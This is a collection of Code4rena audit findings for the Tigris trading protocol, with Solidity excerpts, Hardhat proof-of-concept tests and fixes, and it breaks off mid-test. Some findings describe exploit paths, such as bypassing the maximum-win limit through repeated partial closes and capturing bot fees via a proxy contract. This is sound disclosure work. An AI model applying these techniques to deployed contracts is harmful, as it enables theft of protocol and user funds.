[{"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/658", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-11"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/rbserver-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/657", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-10"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/brgltd-Q.md)."}, {"title": "Chainlink price feed is not sufficiently validated and can return stale price", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/655", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-24"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122   # Vulnerability details  ## Impact As mentioned by https://docs.tigris.trade/protocol/oracle, \"Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted.\" The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122 ```solidity     function verifyPrice(         uint256 _validSignatureTimer,         uint256 _asset,         bool _chainlinkEnabled,         address _chainlinkFeed,         PriceData calldata _priceData,         bytes calldata _signature,         mapping(address => bool) storage _isNode     )         external view     {         ...         if (_chainlinkEnabled && _chainlinkFeed != address(0)) {             int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();             if (assetChainlinkPriceInt != 0) {                 uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());                 require(                     _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&                     _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"                 );             }         }     } ```  Based on https://docs.chain.link/docs/historical-price-data, the followings can be done to avoid using a stale price returned by the Chainlink price feed. 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. \"You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.\" 3. \"A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.\"  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order. 2. When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset. 3. The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price. 4. Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113 can be updated to the following code. ```solidity             (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();             require(answeredInRound >= roundId, \"price is stale\");             require(updatedAt > 0, \"round is incomplete\"); ```"}, {"title": "Governance NFT holder, whose NFT was minted before `Trading._handleOpenFees` function is called, can lose deserved rewards after `Trading._handleOpenFees` function is called", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/649", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-23"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294   # Vulnerability details  ## Impact Calling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 ```solidity     function _handleOpenFees(         uint _asset,         uint _positionSize,         address _trader,         address _tigAsset,         bool _isBot     )         internal         returns (uint _feePaid)     {         ...         unchecked {             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;             ...             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         }         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));     } ```  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 ```solidity     function _handleCloseFees(         uint _asset,         uint _payout,         address _tigAsset,         uint _positionSize,         address _trader,         bool _isBot     )         internal         returns (uint payout_)     {         ...         IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, _daoFeesPaid);         return payout_;     } ```  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294 ```solidity     function distribute(address _tigAsset, uint _amount) external {         if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;         try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {             accRewardsPerNFT[_tigAsset] += _amount/totalSupply();         } catch {             return;         }     } ```  ## Proof of Concept Functions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.  Please add the following test in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details. ```typescript     it.only(\"Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called\", async function () {       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get(\"GovNFT\");       const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");        // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.       // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"0\");     }); ```  Furthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\\Trading.sol`. ```solidity 689:     function _handleOpenFees( 690:         uint _asset, 691:         uint _positionSize, 692:         address _trader, 693:         address _tigAsset, 694:         bool _isBot 695:     ) 696:         internal 697:         returns (uint _feePaid) 698:     { 699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset); ... 732:         unchecked { 733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT; 734:             _feePaid = 735:                 _positionSize 736:                 * (_fees.burnFees + _fees.botFees) // get total fee% 737:                 / DIVISION_CONSTANT // divide by 100% 738:                 + _daoFeesPaid; 739:             emit FeesDistributed( 740:                 _tigAsset, 741:                 _daoFeesPaid, 742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT, 743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0, 744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT, 745:                 _referrer 746:             ); 747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid); 748:         } 749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose 750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); 751:     } ```  Then, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details. ```typescript     it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,              can receive deserved rewards after initiateMarketOrder function is called`, async function () {       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"30000\"), parseEther(\"10000\"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get(\"GovNFT\");       const govnft = await ethers.getContractAt(\"GovNFT\", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, \"10000000000000000000\", \"0\", \"0\", \"0\", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal(\"0\");        // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000       //   because her or his Governance NFT was minted before initiateMarketOrder function was called.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal(\"10000000000000000000\");     }); ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749 can be updated to the following code. ```solidity         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/617", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-06"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/JC-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/608", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-05"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/c3phas-G.md)."}, {"title": "`executeLimitOrder()` modifies open-interest with a wrong position value", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/576", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-21"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L513-L517   # Vulnerability details   The `PairsContract` registeres the total long/short position that's open for a pair of assets, whenever a new position is created the total grows accordingly. However at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.  ## Impact The OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).   ## Proof of Concept In the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.   ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..dfb7f98 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -778,7 +778,7 @@ describe(\"Trading\", function () {       */      it(\"Creating and executing limit buy order, should have correct price and bot fees\", async function () {        // Create limit order -      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero]; +      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"100\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(\"20000\"), PermitData, owner.address);        expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened @@ -787,6 +787,9 @@ describe(\"Trading\", function () {        await network.provider.send(\"evm_increaseTime\", [10]);        await network.provider.send(\"evm_mine\");   +      let count = await position.getCount(); +      let id = count.toNumber() - 1; +        // Execute limit order        let PriceData = [node.address, 0, parseEther(\"10000\"), 10000000, 2000000000, false]; // 0.1% spread        let message = ethers.utils.keccak256( @@ -798,8 +801,22 @@ describe(\"Trading\", function () {        let sig = await node.signMessage(          Buffer.from(message.substring(2), 'hex')        ); +      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);         -      await trading.connect(user).executeLimitOrder(1, PriceData, sig); + +      let oi = await pairscontract.idToOi(0, stabletoken.address); +      expect(oi.longOi.toNumber()).to.equal(0); +      console.log({oi, stable:stabletoken.address}); + +      await trading.connect(user).executeLimitOrder(id, PriceData, sig); +      let trade = await position.trades(id); +      console.log(trade); +      oi = await pairscontract.idToOi(0, stabletoken.address); +      console.log(oi); + +      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber()); + +        expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position        expect((await trading.openFees()).botFees).to.equal(2000000); @@ -807,6 +824,7 @@ describe(\"Trading\", function () {        let [,,,,price,,,,,,,] = await position.trades(1);        expect(price).to.equal(parseEther(\"20020\")); // Should have guaranteed execution price with spread      }); +    return;      it(\"Creating and executing limit sell order, should have correct price and bot fees\", async function () {        // Create limit order        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero]; @@ -1606,6 +1624,7 @@ describe(\"Trading\", function () {        expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(\"1.5\"));      });    }); +  return;    describe(\"Modifying functions\", function () {      it(\"Updating TP/SL on a limit order should revert\", async function () {        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];  ```  Output: ``` 1) Trading        Limit orders and liquidations          Creating and executing limit buy order, should have correct price and bot fees:        AssertionError: expected 100000 to equal 90000       + expected - actual        -100000       +90000 ```   ## Recommended Mitigation Steps Correct the calculation to use margin after fees."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/572", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-09"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xNazgul-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/550", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-04"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/543", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-08"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-Q.md)."}, {"title": "Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/542", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-20"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738   # Vulnerability details  ## Description When ```initiateMarketOrder``` is called, ```_marginAfterFees``` are calculated and then use it to calculate ```_positionSize```  ```solidity uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  The problem is that ```_handleOpenFees``` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.  ## Impact For a referred trade, ```initiateMarketOrder``` always opens a position greater than the one supposed, by allowing to use more margin than the one expected.   ## POC The output of ```_handleOpenFees``` is ```_feePaid```, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees  ```solidity // No refferal fees are considered _feePaid =     _positionSize     * (_fees.burnFees + _fees.botFees) // get total fee%     / DIVISION_CONSTANT // divide by 100%     + _daoFeesPaid; ```  Then we can notice that, if the output of ```_handleOpenFees``` did not consider referral fees, neither would _marginAfterFees do  ```solidity uint256 _marginAfterFees =     _tradeInfo.margin-     _handleOpenFees(         _tradeInfo.asset,         _tradeInfo.margin*_tradeInfo.leverage/1e18,          _trader,         _tigAsset,         false);  // @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  ## Mitigation steps Consider referral fees when ```_feePaid``` is calculated in ```_handleOpenFees```  ```diff // In _handleOpenFees function +   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;     _feePaid =         _positionSize -       * (_fees.burnFees + _fees.botFees) // get total fee% +       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%         / DIVISION_CONSTANT // divide by 100%         + _daoFeesPaid; ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/535", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-07"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/joestakey-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/517", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-06"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/hansfriese-Q.md)."}, {"title": "StopLoss/TakeProfit should be validated again for the new price in `Trading.executeLimitOrder()`", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/512", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-18"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L506   # Vulnerability details  ## Impact The open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.  As a result, the executed market order might be closed immediately and there would be an unexpected loss for users.  ## Proof of Concept As we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.  ```solidity File: 2022-12-tigris\\contracts\\Trading.sol 480:     function executeLimitOrder( 481:         uint _id,  482:         PriceData calldata _priceData, 483:         bytes calldata _signature 484:     )  485:         external 486:     { 487:         unchecked { 488:             _checkDelay(_id, true); 489:             tradingExtension._checkGas(); 490:             if (tradingExtension.paused()) revert TradingPaused(); 491:             require(block.timestamp >= limitDelay[_id]); 492:             IPosition.Trade memory trade = position.trades(_id); 493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true); 494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0); 495:             if (trade.orderType == 0) revert(\"5\"); 496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet 497:             if (trade.direction && trade.orderType == 1) { 498:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet 499:             } else if (!trade.direction && trade.orderType == 1) { 500:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet 501:             } else if (!trade.direction && trade.orderType == 2) { 502:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet 503:                 trade.price = _price; 504:             } else { 505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet 506:                 trade.price = _price; //@audit check sl/tp 507:             }  508:             if(trade.direction) { 509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT; 510:             } else { 511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT; 512:             }  ```  But it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.  The new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.  Originally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`."}, {"title": "Users can bypass the `maxWinPercent` limit using a partially closing", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/507", "labels": ["bug", "3 (High Risk)", "disagree with severity", "judge review requested", "primary issue", "selected for report", "sponsor confirmed", "H-09"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L625-L627   # Vulnerability details  ## Impact Users can bypass the `maxWinPercent` limit using a partial closing.  As a result, users can receive more funds than their upper limit from the protocol.  ## Proof of Concept As we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.  ``` Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually. ```  And this logic was implemented like below in `_closePosition()`.  ```solidity File: 2022-12-tigris\\contracts\\Trading.sol 624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot); 625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit 626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT; 627:                 } ```  But it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.  1. Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees. 2. If `maxWinPercent` = 500%, Alice should receive 500 at most. 3. But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100` 4. After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again. 5. As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should check the `maxWinPercent` between the partial payout and partial margin like below.  ```solidity     _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);      uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++     if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {          _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;     } ```"}, {"title": "User can close an order via `limitClose()`, and take bot fees to themselves", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/468", "labels": ["bug", "2 (Med Risk)", "judge review requested", "selected for report", "sponsor confirmed", "M-17"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576   # Vulnerability details    ## Impact Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot. A user can use that to to reduce the dao fees for closing an order and keep it to themselves. Instead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order. Since that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.  ## Proof of Concept  The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:  ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..e50b0cc 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -17,6 +17,7 @@ describe(\"Trading\", function () {      let TradingExtension;    let tradingExtension; +  let myTrader;      let TradingLibrary;    let tradinglibrary; @@ -37,7 +38,7 @@ describe(\"Trading\", function () {      let MockDAI;    let MockUSDC; -  let mockusdc; +  let mockusdc, mockdai;      let badstablevault;   @@ -55,6 +56,7 @@ describe(\"Trading\", function () {      const Position = await deployments.get(\"Position\");      position = await ethers.getContractAt(\"Position\", Position.address);      MockDAI = await deployments.get(\"MockDAI\"); +    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);      MockUSDC = await deployments.get(\"MockUSDC\");      mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);      const PairsContract = await deployments.get(\"PairsContract\"); @@ -84,6 +86,10 @@ describe(\"Trading\", function () {      TradingLibrary = await deployments.get(\"TradingLibrary\");      tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);      await trading.connect(owner).setLimitOrderPriceRange(1e10); + + +    let mtFactory = await ethers.getContractFactory(\"MyTrader\"); +    myTrader = await mtFactory.deploy(Trading.address, Position.address);    });    describe(\"Check onlyOwner and onlyProtocol\", function () {      it(\"Set max win percent\", async function () { @@ -536,6 +542,31 @@ describe(\"Trading\", function () {        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened        expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(\"0\")); // Should no tigAsset left      }); + +    it(\"Test my trader\", async function () { +      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero]; +      let PriceData = [node.address, 0, 